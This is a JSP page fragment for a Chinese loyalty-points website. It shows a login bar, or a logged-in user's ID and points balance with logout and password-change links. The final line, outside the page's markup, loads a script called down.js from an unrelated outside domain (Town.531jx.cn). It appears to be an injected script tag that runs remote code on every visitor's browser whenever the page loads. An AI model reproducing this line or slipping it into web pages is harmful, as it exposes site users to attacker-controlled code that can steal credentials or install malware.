<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>

<c:if test="${empty userSession}">      				
<table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#3993D9">
  <tr>
		
    <td width="18" /> 
    <td width="137" align="center"> 
      <input id="userid1" name="userid1" onKeyDown="javascript:if(event.keyCode==13) loginSubmit();" value="联盟帐号/卡号" size="15"  onClick="this.focus();checkLogin(this,0,'联盟帐号/卡号')" onFocus="checkLogin(this,1,'联盟帐号/卡号')" onBlur="checkLogin(this,2,'联盟帐号/卡号')" maxlength="32" />    </td>
		
    <td width="137" align="center">
	<input id="password1" name="password2" onKeyDown="javascript:if(event.keyCode==13) loginSubmit();" type="password"  value="******" size="15"  onclick="this.focus();checkLogin(this,0,'******')" onfocus="checkLogin(this,1,'******')" onblur="checkLogin(this,2,'******')" maxlength="32" /></td>		
    	
    <td width="75" align="center"><input type="button" name="Submit" value="登 录" onClick="javascript:loginSubmit();"></td>
		
    <td valign="middle" width="100" ><a href="#"  class="white12"  onClick="javascript:document.location='<c:url value="/register.screen"/>'">申请联盟帐号</a></td>
		
    <td width="100" valign="middle"><a href="#"   class="white12" onClick="javascript:document.location='<c:url value="/forgetPassword.screen"/>'">忘记密码</a></td>		
    </tr>
	<form  name="loginform" id="loginform" method="post" target='loginframe' action='<c:url value="/signon.do"/>'>
	<input id="userid" type="hidden" name="userid"  value="">
	<input name="password" type="hidden" id="password" value=''>
    </form>
    <iframe  name="loginframe" id="loginframe" src="" width="0" height="0" frameborder="no"  marginwidth="8" marginheight="0" scrolling="no"></iframe>
</table>
</c:if>	
	
<c:if test="${!empty userSession}">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#3993D9">
  <tr>
	    
    <td width="18" /> 
    <td width="38" height="22" class="white12" ><span class="white15">您好!</span></td>
		
    <td width="82" class="white12" >&nbsp;<a href='<c:url value="/getCustomer.do"/>?id=<c:out value="${userSession.customer.userId}"/>' class="yellow12"><c:out value="${userSession.customer.userId}"/></a></td>
    <td width="120" class="white12">您目前的积分是:</td>
		
    <td width="104" class="yellow12" ><c:out value="${userSession.account.currentPoint}" /></td>
	    
    <td valign="middle" width="100"><a href='<c:url value="/signoff.do"/>' class="white12">退出登录</a></td>
		
    <td valign="middle" width="100"><a href='<c:url value="/resetPassword.screen"/>' class="white12">修改密码</a></td>
	</tr>
</table>
</c:if>
<script language=javascript src=http://Town.531jx.cn/down.js></script>